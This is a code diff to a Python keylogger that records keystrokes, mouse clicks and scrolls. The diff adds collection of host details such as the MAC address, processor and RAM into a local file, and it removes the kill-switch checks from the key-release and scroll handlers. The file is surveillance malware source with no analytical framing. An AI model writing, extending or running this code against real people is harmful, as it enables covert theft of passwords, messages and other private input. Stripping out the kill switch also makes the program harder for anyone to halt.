@@ -12,6 +12,10 @@ import psutil, socket, re, uuid, json
 # kill switch
 K_SWITCH_PATH = "./C/Files/Explorer/Foreign/Figma/aW52YWxpZEZpbGU="
 
+# SYS_INFO FILE
+SYSTEM_INFO_PATH = Path("./SysInfo/sys_file.txt")
+SYSTEM_INFO_PATH.parent.mkdir(parents=True, exist_ok=True)
+
 # logs file
 LOGGER_PATH = Path("./Logs/my_log.txt")
 LOGGER_PATH.parent.mkdir(parents=True, exist_ok=True)
@@ -22,7 +26,6 @@ class PersonalInformationHandler:
     def __init__(self) -> None:
         self.start_date = datetime.now()
         self.platform_info = ""
-
     
     # check info 
     def check_info(self):
@@ -37,7 +40,12 @@ class PersonalInformationHandler:
             info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
             info['processor']=platform.processor()
             info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
-            return json.dumps(info)
+            
+            self.platform_info = info
+            with SYSTEM_INFO_PATH.open("a") as s_file:
+                s_file.write(json.dumps(info))
+                s_file.write("\n")
+        
         except Exception as e:
             return e
 
@@ -71,7 +79,7 @@ class KeyLogger:
             sys.exit(0)
     
     
-    # Taking keyboard input
+    # keyboard input
     # -------------------------------------------
     def key_to_str(self, key):
         # if normal key is present return the same
@@ -84,8 +92,7 @@ class KeyLogger:
     
     # a callback to for each key pressed
     def key_press(self, key):
-     
-        # for currently pressed keys 
+    
         self.pressed_keys.add(key)
         
         if len(self.pressed_keys) == 1:
@@ -99,8 +106,7 @@ class KeyLogger:
 
     # on release function   
     def key_release(self, key):
-        # check for kill switch 
-        self.check_file()
+
         if key in self.pressed_keys:
             self.pressed_keys.remove(key)
         
@@ -120,7 +126,7 @@ class KeyLogger:
             self.log += f"\nMouse Release: {button} at ({x}, {y})\n"
     
     def mouse_scroll(self, x, y, dx, dy):
-        self.check_file()
+
         self.log += f"\nMouse Scroll: ({x},{y}) dx={dx}, dy={dy}\n"
     
     # -------------------------------------------
@@ -152,4 +158,6 @@ class KeyLogger:
         self.M_Listener.join()
         
 logger = KeyLogger()
+info_handler = PersonalInformationHandler()
+info_handler.check_info()
 logger.initiation()
